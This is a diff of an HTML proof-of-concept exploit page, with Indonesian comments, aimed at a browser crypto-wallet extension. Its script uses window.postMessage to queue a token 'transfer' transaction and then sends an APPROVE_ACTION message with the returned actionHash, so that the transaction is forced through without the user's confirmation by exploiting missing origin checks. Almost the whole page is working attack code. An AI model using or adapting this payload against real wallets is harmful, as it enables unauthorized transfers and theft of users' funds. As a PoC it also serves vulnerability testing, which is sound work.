@@ -1,31 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit PoC: Action Approval</title>
+    <title>PoC: Wallet Authorization Bypass</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        .box { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }
+    </style>
 </head>
 <body>
-    <h1>Security Test: Transaction Approval</h1>
-    <input type="text" id="actionHash" placeholder="Masukkan actionHash dari EXECUTE_TRANSACTION_RES" style="width: 300px;">
-    <button id="approveBtn">Approve & Execute Action</button>
+
+    <div class="box">
+        <h3>1. Langkah Persiapan</h3>
+        <button id="btnExecute">Kirim EXECUTE_TRANSACTION</button>
+        <p><small>Lihat konsol (F12) untuk mendapatkan <b>actionHash</b> dari respons.</small></p>
+    </div>
+
+    <div class="box">
+        <h3>2. Langkah Approval Paksa</h3>
+        <input type="text" id="hashInput" placeholder="Masukkan actionHash di sini" style="width: 250px;">
+        <button id="btnApprove" style="background-color: red; color: white;">APPROVE & EKSEKUSI</button>
+    </div>
 
     <script>
-        document.getElementById('approveBtn').addEventListener('click', () => {
-            const hash = document.getElementById('actionHash').value;
+        // Fungsi pembantu untuk kirim pesan
+        const post = (msg) => window.postMessage(msg, "*");
 
-            // Struktur pesan nyata berdasarkan file background/actionMessaging.ts
-            const msg = {
-                type: "APPROVE_ACTION",
+        // 1. Memicu antrean transaksi
+        document.getElementById('btnExecute').onclick = () => {
+            const tx = {
+                type: "EXECUTE_TRANSACTION",
                 data: {
-                    actionHash: hash
+                    transactions: {
+                        contractAddress: "0x049D...", // Alamat kontrak target
+                        entrypoint: "transfer",
+                        calldata: ["0x...", "1000", "0"]
+                    }
                 }
             };
+            post(tx);
+            console.log("Transaksi dikirim ke antrean. Cari 'actionHash' di respons konsol!");
+        };
 
-            // Mengirim pesan ke ekstensi melalui window.postMessage
-            // Jika dompet rentan, ia akan memproses APPROVE_ACTION tanpa validasi origin
-            window.postMessage(msg, window.location.origin);
-            
-            console.log("APPROVE_ACTION dikirim dengan Hash:", hash);
-        });
+        // 2. Memaksa approval tanpa konfirmasi pengguna
+        document.getElementById('btnApprove').onclick = () => {
+            const hash = document.getElementById('hashInput').value;
+            const approve = {
+                type: "APPROVE_ACTION",
+                data: { actionHash: hash }
+            };
+            post(approve);
+            alert("APPROVE_ACTION terkirim. Cek dompet apakah transaksi langsung ter-eksekusi!");
+        };
     </script>
 </body>
 </html>
